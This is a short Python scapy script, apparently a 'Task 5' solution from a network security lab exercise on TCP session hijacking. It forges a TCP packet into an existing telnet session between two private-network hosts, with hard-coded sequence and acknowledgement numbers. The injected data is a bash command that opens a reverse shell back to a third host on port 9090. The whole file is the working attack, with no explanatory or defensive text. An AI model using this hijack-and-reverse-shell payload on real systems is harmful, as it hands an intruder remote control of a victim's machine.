#!/usr/bin/python3

from scapy.all import *

#Task 5

ip = IP(src = "10.0.2.5", dst = "10.0.2.6")
tcp = TCP(sport = 38172, dport = 23, flags = "A", seq = 1349033823, ack = 945824111)
data = "/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1\n"

pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
